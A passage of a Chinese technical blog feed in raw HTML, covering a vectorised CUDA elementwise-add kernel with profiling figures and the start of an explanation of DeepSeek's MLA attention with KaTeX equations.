class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> FLOAT4(value) (reinterpret_cast<span class="hljs-string">&lt;float4*&gt;</span>(&amp;(value))[0])</span><br><br><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">elementwise_add_f32x4_kernel</span><span class="hljs-params">(<span class="hljs-type">float</span>* a, <span class="hljs-type">float</span>* b, <span class="hljs-type">float</span>* c, <span class="hljs-type">int</span> N)</span> </span>&#123;<br>  <span class="hljs-type">int</span> idx = <span class="hljs-number">4</span> * (blockIdx.x * blockDim.x + threadIdx.x);<br>  <span class="hljs-keyword">if</span> (idx &lt; N) &#123;<br>    float4 reg_a = <span class="hljs-built_in">FLOAT4</span>(a[idx]);<br>    float4 reg_b = <span class="hljs-built_in">FLOAT4</span>(b[idx]);<br>    float4 reg_c;<br>    reg_c.x = reg_a.x + reg_b.x;<br>    reg_c.y = reg_a.y + reg_b.y;<br>    reg_c.z = reg_a.z + reg_b.z;<br>    reg_c.w = reg_a.w + reg_b.w;<br>    <span class="hljs-built_in">FLOAT4</span>(c[idx]) = reg_c;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">2048</span> * <span class="hljs-number">4096</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> blockSize = <span class="hljs-number">64</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> numBlocks = (N + blockSize - <span class="hljs-number">1</span>) / blockSize;<br>elementwise_add_f32_kernel&lt;&lt;&lt;numBlocks, blockSize&gt;&gt;&gt;(d_a, d_b, d_c, N);<br></code></pre></td></tr></table></figure><p>这个函数中，宏定义 <code>FLOAT4</code> 可以将四个 float 一起打包成 <code>float4</code> 数据类型，这样线程在 load 时就可以一次性读取四个 float 数据。</p><p>再次用同样的方法编译和执行，得到 ncompute 输出的数据：</p><p><img src="/img/LLM/ncompute/elementwise_add_f32x4_kernel.png" alt=""></p><p>我们发现，因为线程一次性 load 4 个 float，总共 128 bits，能完全利用 CUDA 中一次 memory transaction 的带宽。读入数据都为有效数据，也因此，L1/L2 cache 的命中率更高。最后， <code>elementwise_add_f32_kernel</code> 总共需要 625496 个 cycles，而优化 <code>elementwise_add_f32x4_kernel</code> 总共仅需 540826 个 cycles。</p><p>再看 Occupancy 表格，我们发现，因为线程块大小为 64，即 2 个 warps，所以 Block Limit Warp 改为了 24，但一个 SM 理论上可以激活的 warps 无法改变，最多为 48 个。因为线程数量减少了 4 倍，所以 <code>waves Per SM</code> = 227.56 / 4 = 56.89 ，Occupancy 提高到了 94.70 %。</p>]]></content>
    
    
    <categories>
      
      <category>cuda</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cuda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DeepSeek 背后的 MLA 和 MoE 架构</title>
    <link href="/2025/01/27/2025-01-30-MLA/"/>
    <url>/2025/01/27/2025-01-30-MLA/</url>
    
    <content type="html"><![CDATA[<p>最近，DeepSeek（深度求索）公司推出的 DeepSeek-V3 和 DeepSeek-R1 大火，吸引了太平洋两岸所有关心关注 AI 发展的人的目光。本文试图从 DeepSeek 这轮爆火现象的背后，探究其中的架构创新，进而挖掘它如此低廉却好用的原因。</p><h1>MLA(Multi-head Latent Attention)</h1><h2 id="一句话说明什么是-MLA">一句话说明什么是 MLA</h2><p>为了进一步解决 KV cache 在模型推理中的性能瓶颈，MLA 架构使用了两个低秩矩阵来压缩 KV cache，减轻缓存压力，从而提升了推理性能。</p><h2 id="看图说话——MLA是如何工作的">看图说话——MLA是如何工作的</h2><p>结合 vllm 最新版本（v0.6.6.post1）和 DeepSeek-V3 论文内的符号，我绘制了下面的计算流程图：</p><p><img src="/img/LLM/mla.png" alt=""></p><ol><li>让我们从这副图的左上角开始，首先，input hidden <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">h_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 经过一次 RMSNorm 后，进入到了 MLA 层。</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">h_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 会被分为两条路径，上面一条路径用来产生 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">q_{t,i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，下面的路径产生 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">k_{t,i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">v_{t,i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></li><li>先来关注上一条路径 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">q_{t,i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，<u>不同于之前传统的 attention 机制：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mi>Q</mi></msup><msub><mi>h</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">W^Qh_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9913em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 来计算出 Query，MLA 使用了两个低秩矩阵来代替 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mi>Q</mi></msup></mrow><annotation encoding="application/x-tex">W^Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span></span></span>:</u></li></ol><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msubsup><mi>c</mi><mi>t</mi><mi>Q</mi></msubsup><mo>=</mo><msup><mi>W</mi><mrow><mi>D</mi><mi>Q</mi></mrow></msup><msub><mi>h</mi><mi>t</mi></msub></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(1)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">c^Q_t=W^{DQ}h_t \tag{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.205em;vertical-align:-0.2458em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9592em;"><span style="top:-2.4542em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2458em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0413em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:1.2092em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">1</span></span><span class="mord">)</span></span></span></span></span></span></p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mo stretchy="false">{</mo><msubsup><mi>q</mi><mi>t</mi><mi>C</mi></msubsup><mo separator="true">,</mo><msubsup><mi>q</mi><mi>t</mi><mi>R</mi></msubsup><mo stretchy="false">}</mo><mo>=</mo><mo stretchy="false">{</mo><msup><mi>W</mi><mrow><mi>U</mi><mi>Q</mi></mrow></msup><msubsup><mi>c</mi><mi>t</mi><mi>Q</mi></msubsup><mo separator="true">,</mo><mi mathvariant="normal">RoPE</mi><mo>⁡</mo><mo stretchy="false">(</mo><msup><mi>W</mi><mrow><mi>Q</mi><mi>R</mi></mrow></msup><msubsup><mi>c</mi><mi>t</mi><mi>Q</mi></msubsup><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(2)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">\{q^C_t,q^R_t\}=\{W^{UQ}c^Q_t,\operatorname{RoPE}(W^{QR}c^Q_t) \} \tag{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2092em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9592em;"><span style="top:-2.4542em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2458em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mord mathrm">RoPE</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">QR</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9592em;"><span style="top:-2.4542em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2458em;"><span></span></span></span></span></span></span><span class="mclose">)}</span></span><span class="tag"><span class="strut" style="height:1.2092em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">2</span></span><span class="mord">)</span></span></span></span></span></span></p><p>这两个低秩矩阵就是上面式子中的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>D</mi><mi>Q</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{DQ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>U</mi><mi>Q</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{UQ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span></span></span></span>，分别表示是 down proj 和 up proj 的 query 权重矩阵。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>Q</mi><mi>R</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{QR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">QR</span></span></span></span></span></span></span></span></span></span></span></span> 是用于产生携带 RoPE 信息的部分 query。这里涉及到 MLA 的另一个创新：<u>不同于传统的 attention 机制，MLA 仅使部分 QKV 携带 RoPE 的位置编码信息。</u></p><ol start="4"><li>更重要的 KV cache 这边的下一条路径。同样的思路，使用两个低秩的矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>D</mi><mi>K</mi><mi>V</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{DKV}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">DK</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span></span></span></span></span></span></span></span> + <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>K</mi><mi>R</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{KR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>U</mi><mi>K</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{UK}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span></span></span></span></span></span></span></span> + <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>U</mi><mi>V</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{UV}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span></span></span></span></span></span></span></span> 来计算出 key，方法是首先计算出 latent 张量：</li></ol><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup><mo>=</mo><msup><mi>W</mi><mrow><mi>D</mi><mi>K</mi><mi>V</mi></mrow></msup><msub><mi>h</mi><mi>t</mi></msub></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(3)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">c^{KV}_t=W^{DKV}h_t \tag{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1383em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0413em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">DK</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">3</span></span><span class="mord">)</span></span></span></span></span></span></p><p>然后使用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup></mrow><annotation encoding="application/x-tex">c^{KV}_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0883em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" 